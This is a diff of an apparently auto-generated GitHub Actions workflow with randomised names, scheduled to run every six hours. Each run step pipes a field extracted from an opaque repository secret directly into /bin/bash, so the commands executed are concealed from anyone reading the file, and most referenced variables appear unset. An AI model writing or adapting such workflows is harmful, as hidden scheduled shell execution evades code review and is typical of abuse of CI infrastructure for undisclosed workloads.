@@ -3,24 +3,21 @@ name: chenhaoqi8971
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
-
-jobs:  # 27375
+    - cron: '43 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenhaoqi8971
         env:
-          hesb69544: ${{ secrets.hesb69544 }}
+          aja0859: ${{ secrets.aja0859 }}
         run: |
-          echo $hesb69544 | jq -r .xg0 | /bin/bash
-          echo $ddyra077 | jq -r .etvb09926 | /bin/bash
-          echo $dhn482 | jq -r .d73 | /bin/bash
-          echo $hvzcg88995 | jq -r .jq52168 | /bin/bash
-          echo $c70941 | jq -r .hvd04438 | /bin/bash
-          echo $flcff95822 | jq -r .ie5528 | /bin/bash
-          echo $we20 | jq -r .ztob318 | /bin/bash
-          echo $yzk98 | jq -r .w7 | /bin/bash
-          echo $brm4501 | jq -r .z855 | /bin/bash
+          echo $aja0859 | jq -r .jfs8 | /bin/bash
+          echo $ccpgy273 | jq -r .m3 | /bin/bash
+          echo $vgnc630 | jq -r .gfwcg6 | /bin/bash
+          echo $lques25 | jq -r .ear270 | /bin/bash
+          echo $vq98 | jq -r .k37465 | /bin/bash
+          echo $j65715 | jq -r .eop4738 | /bin/bash
 
